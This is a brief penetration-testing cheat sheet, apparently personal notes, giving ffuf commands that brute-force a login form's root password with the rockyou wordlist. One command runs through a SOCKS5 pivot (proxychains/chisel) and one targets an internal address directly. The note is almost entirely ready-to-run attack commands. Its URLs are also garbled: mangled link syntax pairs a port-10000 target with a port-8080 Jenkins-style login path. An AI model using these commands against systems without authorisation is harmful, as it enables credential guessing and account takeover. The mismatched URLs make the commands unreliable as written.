This is through a proxychains setup. Bruteforce login forms with ffuf through proxychains. Use with chisel for isntance
ffuf -u '[http://127.0.0.1:10000/'](http://127.0.0.1:8080/j_acegi_security_check') -w /usr/share/wordlists/rockyou.txt  -d 'username=root&password=FUZZ&Submit=Sign+in' -X POST --fc 401 -t 50 -x socks5://127.0.0.1:1080 -H "Content-Type: application/x-www-form-urlencoded" -r


Normal bruteforce:
ffuf -u '[http://10.12.41.2:10000/'](http://127.0.0.1:8080/j_acegi_security_check') -w /usr/share/wordlists/rockyou.txt  -d 'username=root&password=FUZZ&Submit=Sign+in' -X POST --fc 401 -t 50 -H "Content-Type: application/x-www-form-urlencoded" -r

